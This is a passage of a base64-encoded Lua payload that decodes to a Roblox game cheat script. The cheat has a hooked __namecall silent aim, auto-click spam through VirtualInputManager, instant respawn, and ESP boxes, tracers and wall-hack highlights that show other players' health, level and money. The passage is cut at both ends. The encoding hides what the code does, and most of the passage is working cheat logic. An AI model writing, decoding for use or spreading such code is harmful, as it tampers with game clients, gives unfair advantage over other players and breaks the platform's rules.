"blBvaW50VG9SYXkiIG9yIG1ldGhvZCA9PSAiVmlld3BvcnRQb2ludFRvUmF5IikgYW5kIHNlbGYgPT0gY2FtZXJhIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSBnZXRDbG9zZXN0UGxheWVyVG9Nb3VzZShDb25maWcuU2lsZW50Rk9WLCB0cnVlKQogICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldCBhbmQgdGFyZ2V0LkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFBhcnQgPSB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0Iikgb3IgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiVG9yc28iKSBvciB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBvcmlnaW4gPSBzZWxmLkNGcmFtZS5Qb3NpdGlvbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZGlyZWN0aW9uID0gKHRhcmdldFBhcnQuUG9zaXRpb24gLSBvcmlnaW4pLlVuaXQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBSYXkubmV3KG9yaWdpbiwgZGlyZWN0aW9uKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgcmV0dXJuIF9fbmFtZWNhbGwoc2VsZiwgLi4uKQogICAgICAgIGVuZCkKICAgIGVuZCkKICAgIAogICAgCiAgICAtLSBIZWxwZXIgdG8gY2hlY2sgaWYgYW55IGNvbWJhdCBrZXkgaXMgY3VycmVudGx5IGhlbGQgZG93bgogICAgbG9jYWwgZnVuY3Rpb24gSXNDb21iYXRLZXlEb3duKCkKICAgICAgICAtLSBDaGVjayBLZXlib2FyZCBLZXlzCiAgICAgICAgZm9yIF8sIGtleSBpbiBwYWlycyhDb25maWcuQ29tYmF0S2V5cykgZG8KICAgICAgICAgICAgaWYgVXNlcklucHV0U2VydmljZTpJc0tleURvd24oa2V5KSB0aGVuCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAtLSBDaGVjayBNb3VzZQogICAgICAgIHJldHVybiBmYWxzZQogICAgZW5kCgogICAgLS0gR09EIE1PREUgQ0xJQ0sgRlVOQ1RJT04gKEJVUlNUIFNQQU0pCiAgICBsb2NhbCBmdW5jdGlvbiBOdWNsZWFyQ2xpY2sodGFyZ2V0T3ZlcnJpZGUpCiAgICAgICAgbG9jYWwgY2xpY2tYLCBjbGlja1kKICAgICAgICBsb2NhbCBtb3VzZVBvcyA9IFVzZXJJbnB1dFNlcnZpY2U6R2V0TW91c2VMb2NhdGlvbigpCiAgICAgICAgCiAgICAgICAgaWYgdGFyZ2V0T3ZlcnJpZGUgdGhlbgogICAgICAgICAgICBjbGlja1ggPSB0YXJnZXRPdmVycmlkZS5YCiAgICAgICAgICAgIGNsaWNrWSA9IHRhcmdldE92ZXJyaWRlLlkKICAgICAgICBlbHNlCiAgICAgICAgICAgIGNsaWNrWCA9IG1vdXNlUG9zLlgKICAgICAgICAgICAgY2xpY2tZID0gbW91c2VQb3MuWQogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIFByZXZlbnQgY2xpY2tpbmcgb24gQ2hlYXQgR1VJCiAgICAgICAgbG9jYWwgZ3VpID0gQ29yZUd1aTpGaW5kRmlyc3RDaGlsZCgiRGVzeW5jR1VJX1YxMDIiKSBvciAocGxheWVyLlBsYXllckd1aSBhbmQgcGxheWVyLlBsYXllckd1aTpGaW5kRmlyc3RDaGlsZCgiRGVzeW5jR1VJX1YxMDIiKSkKICAgICAgICBpZiBndWkgdGhlbgogICAgICAgICAgICBsb2NhbCBtYWluRnJhbWUgPSBndWk6RmluZEZpcnN0Q2hpbGQoIk1haW5GcmFtZSIpCiAgICAgICAgICAgIGlmIG1haW5GcmFtZSBhbmQgbWFpbkZyYW1lLlZpc2libGUgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgYWJzUG9zID0gbWFpbkZyYW1lLkFic29sdXRlUG9zaXRpb24KICAgICAgICAgICAgICAgIGxvY2FsIGFic1NpemUgPSBtYWluRnJhbWUuQWJzb2x1dGVTaXplCiAgICAgICAgICAgICAgICBpZiBjbGlja1ggPj0gYWJzUG9zLlggYW5kIGNsaWNrWCA8PSBhYnNQb3MuWCArIGFic1NpemUuWCBhbmQgY2xpY2tZID49IGFic1Bvcy5ZIGFuZCBjbGlja1kgPD0gYWJzUG9zLlkgKyBhYnNTaXplLlkgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIEZvcmNlIE1vdXNlIE1vdmUgSW5zdGFudAogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgVmlydHVhbElucHV0TWFuYWdlcjpTZW5kTW91c2VNb3ZlRXZlbnQoY2xpY2tYLCBjbGlja1ksIGdhbWUpCiAgICAgICAgZW5kKQogICAgICAgIAogICAgICAgIC0tIENsaWNrCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBWaXJ0dWFsSW5wdXRNYW5hZ2VyOlNlbmRNb3VzZUJ1dHRvbkV2ZW50KGNsaWNrWCwgY2xpY2tZLCAwLCB0cnVlLCBnYW1lLCAxKQogICAgICAgICAgICBWaXJ0dWFsSW5wdXRNYW5hZ2VyOlNlbmRNb3VzZUJ1dHRvbkV2ZW50KGNsaWNrWCwgY2xpY2tZLCAwLCBmYWxzZSwgZ2FtZSwgMSkKICAgICAgICBlbmQpCiAgICAgICAgaWYgbW91c2UxY2xpY2sgdGhlbiBtb3VzZTFjbGljaygpIGVuZAogICAgICAgIAogICAgICAgIGlmIGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIGxvY2FsIHRvb2wgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJUb29sIikKICAgICAgICAgICAgaWYgdG9vbCBhbmQgKENvbmZpZy5FYXN5TG9jayBvciB0aWNrKCkgLSBsYXN0VG9vbFVzZSA+IDAuMjUpIHRoZW4KICAgICAgICAgICAgICAgIHRvb2w6QWN0aXZhdGUoKQogICAgICAgICAgICAgICAgbGFzdFRvb2xVc2UgPSB0aWNrKCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgbG9jYWwgZnVuY3Rpb24gQ2xlYXJFU1AoKQogICAgICAgIEVTUEZvbGRlcjpDbGVhckFsbENoaWxkcmVuKCkKICAgIGVuZAoKICAgIC0tIEJpbmQgSW5zdGFudCBSZXNwYXduIHRvIEh1bWFub2lkLkRpZWQKICAgIGxvY2FsIGZ1bmN0aW9uIEJpbmRJbnN0YW50UmVzcGF3bigpCiAgICAgICAgaWYgaW5zdGFudFJlc3Bhd25Db25uIHRoZW4gaW5zdGFudFJlc3Bhd25Db25uOkRpc2Nvbm5lY3QoKTsgaW5zdGFudFJlc3Bhd25Db25uID0gbmlsIGVuZAogICAgICAgIGlmIGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIGxvY2FsIGh1bSA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgICAgICBpZiBodW0gdGhlbgogICAgICAgICAgICAgICAgaW5zdGFudFJlc3Bhd25Db25uID0gaHVtLkRpZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgdGFzay5kZWZlcihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgcGxheWVyOkxvYWRDaGFyYWN0ZXIoKSBlbmQpCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKCgogICAgbG9jYWwgZnVuY3Rpb24gVXBkYXRlRVNQKCkKICAgICAgICBpZiBub3QgQ29uZmlnLkVTUEJveCBhbmQgbm90IENvbmZpZy5FU1BOYW1lIGFuZCBub3QgQ29uZmlnLkVTUEx2bCBhbmQgbm90IENvbmZpZy5FU1BIUCBhbmQgbm90IENvbmZpZy5FU1BDaGFtcyBhbmQgbm90IENvbmZpZy5FU1BEb3QgYW5kIG5vdCBDb25maWcuRVNQTlBDIGFuZCBub3QgQ29uZmlnLkVTUEZydWl0IGFuZCBub3QgQ29uZmlnLlNob3dNb25leSBhbmQgbm90IENvbmZpZy5TaG93RnJhZ21lbnRzIGFuZCBub3QgQ29uZmlnLlNob3dCb3VudHkgYW5kIG5vdCBDb25maWcuRVNQVHJhY2VycyB0aGVuCiAgICAgICAgICAgIENsZWFyRVNQKCkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCgogICAgICAgIGZvciBfLCBwIGluIHBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICBpZiBwIH49IHBsYXllciBhbmQgcC5DaGFyYWN0ZXIgYW5kIHAuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgYW5kIHAuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIGFuZCBwLkNoYXJhY3Rlci5IdW1hbm9pZC5IZWFsdGggPiAwIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGNoYXIgPSBwLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgbG9jYWwgcm9vdCA9IGNoYXIuSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICAgICAgbG9jYWwgaHVtID0gY2hhci5IdW1hbm9pZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBlc3BJZCA9IHAuTmFtZSAuLiAiX0VTUCIKICAgICAgICAgICAgICAgIGxvY2FsIGVzcEdyb3VwID0gRVNQRm9sZGVyOkZpbmRGaXJzdENoaWxkKGVzcElkKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBub3QgZXNwR3JvdXAgdGhlbgogICAgICAgICAgICAgICAgICAgIGVzcEdyb3VwID0gSW5zdGFuY2UubmV3KCJGb2xkZXIiKQogICAgICAgICAgICAgICAgICAgIGVzcEdyb3VwLk5hbWUgPSBlc3BJZAogICAgICAgICAgICAgICAgICAgIGVzcEdyb3VwLlBhcmVudCA9IEVTUEZvbGRlcgogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIC0tIEJveAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGJveCA9IEluc3RhbmNlLm5ldygiU2VsZWN0aW9uQm94IikKICAgICAgICAgICAgICAgICAgICBib3guTmFtZSA9ICJCb3giCiAgICAgICAgICAgICAgICAgICAgYm94LkFkb3JuZWUgPSByb290CiAgICAgICAgICAgICAgICAgICAgYm94LkxpbmVUaGlja25lc3MgPSAwLjA1CiAgICAgICAgICAgICAgICAgICAgYm94LlBhcmVudCA9IGVzcEdyb3VwCgogICAgICAgICAgICAgICAgICAgIC0tIFRleHQgSW5mbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIGJiID0gSW5zdGFuY2UubmV3KCJCaWxsYm9hcmRHdWkiKQogICAgICAgICAgICAgICAgICAgIGJiLk5hbWUgPSAiSW5mbyIKICAgICAgICAgICAgICAgICAgICBiYi5BZG9ybmVlID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpIG9yIHJvb3QKICAgICAgICAgICAgICAgICAgICBiYi5TaXplID0gVURpbTIubmV3KDAsIDEwMCwgMCwgNTApCiAgICAgICAgICAgICAgICAgICAgYmIuU3R1ZHNPZmZzZXQgPSBWZWN0b3IzLm5ldygwLCAzLjUsIDApCiAgICAgICAgICAgICAgICAgICAgYmIuQWx3YXlzT25Ub3AgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgYmIuTWF4RGlzdGFuY2UgPSBtYXRoLmh1Z2UKICAgICAgICAgICAgICAgICAgICBiYi5QYXJlbnQgPSBlc3BHcm91cAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHR4dCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgICAgICAgICAgICAgICAgICB0eHQuTmFtZSA9ICJFU1BUZXh0IgogICAgICAgICAgICAgICAgICAgIHR4dC5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCiAgICAgICAgICAgICAgICAgICAgdHh0LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICAgICAgdHh0LlRleHRTdHJva2VUcmFuc3BhcmVuY3kgPSAwCiAgICAgICAgICAgICAgICAgICAgdHh0LlRleHRTdHJva2VDb2xvcjMgPSBDb2xvcjMubmV3KDAsMCwwKQogICAgICAgICAgICAgICAgICAgIHR4dC5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICAgICAgICAgICAgICB0eHQuVGV4dFNpemUgPSAxMgogICAgICAgICAgICAgICAgICAgIHR4dC5UZXh0ID0gIiIKICAgICAgICAgICAgICAgICAgICB0eHQuUmljaFRleHQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIHR4dC5QYXJlbnQgPSBiYgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIGVzcEdyb3VwIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBib3ggPSBlc3BHcm91cDpGaW5kRmlyc3RDaGlsZCgiQm94IikKICAgICAgICAgICAgICAgICAgICBsb2NhbCBiYiA9IGVzcEdyb3VwOkZpbmRGaXJzdENoaWxkKCJJbmZvIikKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAtLSBXQUxMIEhBQ0sgKENIQU1TKSBMT0dJQwogICAgICAgICAgICAgICAgICAgIGxvY2FsIGhpZ2hsaWdodCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkN5YmVyQ2hhbXMiKQogICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5FU1BDaGFtcyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBoaWdobGlnaHQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaGlnaGxpZ2h0ID0gSW5zdGFuY2UubmV3KCJIaWdobGlnaHQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaGlnaGxpZ2h0Lk5hbWUgPSAiQ3liZXJDaGFtcyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhpZ2hsaWdodC5QYXJlbnQgPSBjaGFyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoaWdobGlnaHQuRGVwdGhNb2RlID0gRW51bS5IaWdobGlnaHREZXB0aE1vZGUuQWx3YXlzT25Ub3AKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhpZ2hsaWdodC5GaWxsQ29sb3IgPSBDdXJyZW50VGhlbWVDb2xvcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaGlnaGxpZ2h0Lk91dGxpbmVDb2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoaWdobGlnaHQuRmlsbFRyYW5zcGFyZW5jeSA9IDAuNQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaGlnaGxpZ2h0Lk91dGxpbmVUcmFuc3BhcmVuY3kgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgaWYgaGlnaGxpZ2h0IHRoZW4gaGlnaGxpZ2h0OkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAtLSBET1QgTE9HSUMgKFJFRCBQT0lOVCkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBkb3RHdWkgPSBlc3BHcm91cDpGaW5kRmlyc3RDaGlsZCgiRG90R3VpIikKICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuRVNQRG90IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IGRvdEd1aSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb3RHdWkgPSBJbnN0YW5jZS5uZXcoIkJpbGxib2FyZEd1aSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb3RHdWkuTmFtZSA9ICJEb3RHdWkiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb3RHdWkuU2l6ZSA9IFVEaW0yLm5ldygwLCAxMCwgMCwgMTApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb3RHdWkuQWx3YXlzT25Ub3AgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb3RHdWkuQWRvcm5lZSA9IHJvb3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvdEd1aS5QYXJlbnQgPSBlc3BHcm91cAogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBkb3RGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZG90RnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAxLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZG90RnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkgLS0gUmVkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb3RGcmFtZS5Cb3JkZXJTaXplUGl4ZWwgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb3RGcmFtZS5QYXJlbnQgPSBkb3RHdWkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZG90Q29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb3RDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMSwgMCkgLS0gQ2lyY2xlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb3RDb3JuZXIuUGFyZW50ID0gZG90RnJhbWUKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGRvdEd1aS5FbmFibGVkID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZG90R3VpIHRoZW4gZG90R3VpOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBocFBlcmNlbnQgPSBodW0uSGVhbHRoIC8gaHVtLk1heEhlYWx0aAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGN1c3RvbUNvbG9yID0gQ29sb3IzLmZyb21SR0IoQ29uZmlnLkVTUENvbG9yUiwgQ29uZmlnLkVTUENvbG9yRywgQ29uZmlnLkVTUENvbG9yQikKICAgICAgICAgICAgICAgICAgICBsb2NhbCB1c2VDb2xvciA9IGN1c3RvbUNvbG9yCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgLS0gVFJBQ0VSUyBMT0dJQyAoTElORVMpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0QXR0ID0gcm9vdDpGaW5kRmlyc3RDaGlsZCgiRVNQX1RhcmdldF9BdHQiKQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0YXJnZXRBdHQgdGhlbiB0YXJnZXRBdHQgPSBJbnN0YW5jZS5uZXcoIkF0dGFjaG1lbnQiKTsgdGFyZ2V0QXR0Lk5hbWUgPSAiRVNQX1RhcmdldF9BdHQiOyB0YXJnZXRBdHQuUGFyZW50ID0gcm9vdCBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBiZWFtID0gdGFyZ2V0QXR0OkZpbmRGaXJzdENoaWxkKCJUcmFjZXJCZWFtIikKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuRVNQVHJhY2VycyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIG15Um9vdCA9IHBsYXllci5DaGFyYWN0ZXIgYW5kIHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBteVJvb3QgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbXlBdHQgPSBteVJvb3Q6RmluZEZpcnN0Q2hpbGQoIkVTUF9PcmlnaW5fQXR0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBteUF0dCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbXlBdHQgPSBJbnN0YW5jZS5uZXcoIkF0dGFjaG1lbnQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG15QXR0Lk5hbWUgPSAiRVNQX09yaWdpbl9BdHQiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbXlBdHQuUGFyZW50ID0gbXlSb290CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IGJlYW0gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJlYW0gPSBJbnN0YW5jZS5uZXcoIkJlYW0iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJlYW0uTmFtZSA9ICJUcmFjZXJCZWFtIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJlYW0uRmFjZUNhbWVyYSA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBiZWFtLlRyYW5zcGFyZW5jeSA9IE51bWJlclNlcXVlbmNlLm5ldygwLjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYmVhbS5XaWR0aDAgPSAwLjEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBiZWFtLldpZHRoMSA9IDAuMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJlYW0uUGFyZW50ID0gdGFyZ2V0QXR0IC0tIEZpeDogUGFyZW50IHRvIFdvcmtzcGFjZSB0byBiZSB2aXNpYmxlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgYmVhbS5BdHRhY2htZW50MCA9IG15QXR0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBiZWFtLkF0dGFjaG1lbnQxID0gdGFyZ2V0QXR0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBiZWFtLkNvbG9yID0gQ29sb3JTZXF1ZW5jZS5uZXcodXNlQ29sb3IpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBiZWFtLkVuYWJsZWQgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgaWYgYmVhbSB0aGVuIGJlYW06RGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIGJveCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5FU1BCb3ggdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYm94LlZpc2libGUgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBib3guQWRvcm5lZSA9IHJvb3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJveC5Db2xvcjMgPSB1c2VDb2xvcgogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBib3guVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIGJiIGFuZCBiYjpGaW5kRmlyc3RDaGlsZCgiRVNQVGV4dCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdHh0TGFiZWwgPSBiYi5FU1BUZXh0CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5FU1BOYW1lIG9yIENvbmZpZy5FU1BIUCBvciBDb25maWcuRVNQTHZsIG9yIChDb25maWcuSW5zcGVjdG9yTmFtZSB+PSAiIiBhbmQgKENvbmZpZy5TaG93TW9uZXkgb3IgQ29uZmlnLlNob3dGcmFnbWVudHMgb3IgQ29uZmlnLlNob3dCb3VudHkpIGFuZCBzdHJpbmcuZmluZChwLk5hbWU6bG93ZXIoKSwgQ29uZmlnLkluc3BlY3Rvck5hbWU6bG93ZXIoKSkpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJiLkVuYWJsZWQgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBiYi5BZG9ybmVlID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpIG9yIHJvb3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGV4dFN0ciA9ICIiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuRVNQTmFtZSB0aGVuIHRleHRTdHIgPSB0ZXh0U3RyIC4uIHAuTmFtZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5FU1BMdmwgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGx2bCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpIGx2bCA9IHAuRGF0YS5MZXZlbC5WYWx1ZSBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGV4dFN0ciB+PSAiIiB0aGVuIHRleHRTdHIgPSB0ZXh0U3RyIC4uICJcbiIgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGV4dFN0ciA9IHRleHRTdHIgLi4gIltMdi4gIiAuLiBsdmwgLi4gIl0iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5FU1BIUCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGV4dFN0ciB+PSAiIiB0aGVuIHRleHRTdHIgPSB0ZXh0U3RyIC4uICJcbiIgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGV4dFN0ciA9IHRleHRTdHIgLi4gIlsiIC4uIG1hdGguZmxvb3IoaHVtLkhlYWx0aCkgLi4gIiBIUF0iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLkluc3BlY3Rvck5hbWUgfj0gIiIgYW5kIHN0cmluZy5maW5kKHAuTmFtZTpsb3dlcigpLCBDb25maWcuSW5zcGVjdG9yTmFtZTpsb3dlcigpKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLlNob3dNb25leSB0aGVuCiAgICAgICAgICAgICAgICAgICAg" .. "ICAgICAgICAgICAgICAgIGxvY2FsIHZhbCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKSB2YWwgPSBwLkRhdGEuQmVsaS5WYWx1ZSBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRleHRTdHIgfj0gIiIgdGhlbiB0ZXh0U3RyID0gdGV4dFN0ciAuLiAiXG4iIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZXh0U3RyID0gdGV4dFN0ciAuLiAiW/CfkrAgIiAuLiB2YWwgLi4gIl0iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLlNob3dGcmFnbWVudHMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YWwgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgdmFsID0